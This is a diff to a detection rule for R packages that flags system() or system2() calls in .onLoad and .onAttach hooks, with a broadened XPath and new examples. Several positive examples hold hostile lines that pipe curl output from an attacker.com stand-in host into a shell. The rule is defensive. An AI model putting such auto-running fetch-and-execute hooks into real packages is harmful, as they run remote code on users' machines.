@@ -8,20 +8,48 @@ message: >-
   system() or system2() inside .onLoad or .onAttach hooks execute arbitrary
   shell commands automatically when a package is loaded.
 description: >-
-  Flag system() or system2() calls inside .onLoad or .onAttach.
+  Flag system() or system2() calls inside .onLoad or .onAttach. Matches
+  assignments using <-, =, or -> so that all syntactically valid definition
+  forms are covered.
 xpath: >-
-  //expr[
-    LEFT_ASSIGN
-    and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
-    and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
-      text() = 'system' or text() = 'system2'
-    ]
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
+        text() = 'system' or text() = 'system2'
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[text() = 'system' or text() = 'system2']
+    )
   ]
-example_positive: |
-  .onLoad <- function(libname, pkgname) {
-    system("curl https://attacker.com/exfil | sh")
-  }
-example_negative: |
-  .onLoad <- function(libname, pkgname) {
-    packageStartupMessage("Package loaded.")
-  }
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      system("curl https://attacker.com/exfil | sh")
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      system2("sh", args = c("-c", "curl https://attacker.com/exfil | bash"))
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      system("id > /tmp/pwned")
+    }
+  - |
+    (function(libname, pkgname) {
+      system2("curl", args = c("-s", "https://attacker.com/ping"))
+    }) -> .onLoad
+example_negative:
+  - |
+    run_cmd <- function(x) {
+      system(x)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      system("cleanup.sh")
+    }
